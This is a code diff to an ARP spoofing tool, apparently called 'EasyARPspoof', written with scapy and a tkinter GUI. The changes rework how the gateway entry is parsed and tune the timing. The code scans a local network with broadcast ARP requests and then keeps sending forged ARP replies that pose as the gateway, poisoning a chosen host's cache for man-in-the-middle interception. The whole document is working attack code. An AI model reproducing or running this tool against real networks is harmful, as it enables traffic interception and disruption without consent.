@@ -1,4 +1,5 @@
 # -*- coding:utf-8 -*-
+
 from scapy.all import *
 from tkinter import *
 import os
@@ -23,11 +24,12 @@ def off(target, gateway):
 
 def arpspoof(target, gateway):
     target = TLIST[target].split()
+    gateway = TLIST[gateway].split()
     def on():
-        arptable(gateway)
+        arptable(TLIST.index(gateway[0] + ' ' + gateway[1]))
         while (SLIST[TLIST.index(target[0] + ' ' + target[1])] == 1):
-            send(ARP(op=2, pdst=target[0], hwdst=target[1], psrc=gateway), verbose=False)
-            time.sleep(5)
+            send(ARP(op=2, pdst=target[0], hwdst=target[1], psrc=gateway[0]), verbose=False)
+            time.sleep(8)
     if gateway == 0:
         errormassege()
     else:
@@ -64,7 +66,7 @@ def arptable(var):
 def multiarp(arg1 ,scanrange):
     scanip = str(scanrange) + str(arg1)
     _pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(scanip))
-    ans, unans = srp( _pkt, timeout=2, verbose=False)
+    ans, unans = srp( _pkt, timeout=3, verbose=False)
     for snt, recv in ans:
         if recv:
             target = recv[ARP].psrc + ' ' + recv[Ether].src
@@ -87,7 +89,6 @@ def arpscan(scanip):
 
 def start():
     arpscan(myip())
-
 
 gui = Tk()
 gui.title("EasyARPspoof")
